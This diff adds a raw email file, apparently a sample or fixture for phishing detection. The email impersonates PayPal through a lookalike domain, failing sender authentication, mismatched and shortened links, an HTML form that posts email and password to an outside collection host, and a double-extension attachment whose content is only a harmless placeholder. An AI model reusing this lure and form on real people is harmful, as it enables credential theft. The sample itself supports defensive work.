@@ -1,0 +1,67 @@
+Received: from mx.recipient.example ([10.0.0.5]) by inbox.recipient.example;
+ Mon, 28 Sep 2026 09:14:03 +0000
+Received: from paypa1-support.com (unknown [185.220.101.47]) by
+ mx.recipient.example with ESMTP id 4F2A1; Mon, 28 Sep 2026 09:14:01 +0000
+Authentication-Results: mx.recipient.example; spf=fail
+ smtp.mailfrom=bulk-sender.ru; dkim=none; dmarc=fail
+ header.from=paypa1-support.com
+Return-Path: <bounce@bulk-sender.ru>
+From: "PayPal Security (service@paypal.com)" <security@paypa1-support.com>
+Reply-To: paypal.resolution.center@gmail.com
+To: victim@recipient.example
+Subject: Urgent: Your account has been suspended
+Date: Mon, 28 Sep 2026 09:13:58 +0000
+Message-ID: <a81f2c@mailer.bulk-sender.ru>
+X-Mailer: PHPMailer 6.8.0
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============1431158851487682009=="
+
+--===============1431158851487682009==
+Content-Type: multipart/alternative;
+ boundary="===============6622197557359629989=="
+
+--===============6622197557359629989==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Dear Customer,
+
+We detected unusual sign-in activity. Your account will be suspended within 2=
+4 hours.
+Verify your account immediately: http://paypa1-secure.xyz/login/verify.php
+
+PayPal Security Team
+
+--===============6622197557359629989==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body>
+<p>Dear Customer,</p>
+<p>We detected <b>unusual sign-in activity</b>. Your account will be suspende=
+d within 24 hours.</p>
+<p><a href=3D"http://paypa1-secure.xyz/login/verify.php?session=3D8812">https=
+://www.paypal.com/signin</a></p>
+<p>Or use our <a href=3D"https://bit.ly/3xYzPay">secure portal</a> or
+<a href=3D"http://185.220.101.47/paypal/webscr/index.php">backup server</a>.<=
+/p>
+<p><a href=3D"https://www.google.com/url?q=3Dhttps://paypal-account-review.we=
+b.app/auth">Review activity</a></p>
+<form action=3D"https://paypa1-secure.xyz/collect.php" method=3D"post">
+  Email <input name=3D"email"> Password <input type=3D"password" name=3D"pw">=
+ <input type=3D"submit">
+</form>
+<p>PayPal Security Team</p></body></html>
+
+--===============6622197557359629989==--
+
+--===============1431158851487682009==
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Invoice_8812.pdf.exe"
+MIME-Version: 1.0
+
+TVqQACBoYXJtbGVzcyBzYW1wbGUgLSBub3QgYSByZWFsIGV4ZWN1dGFibGU=
+
+--===============1431158851487682009==--
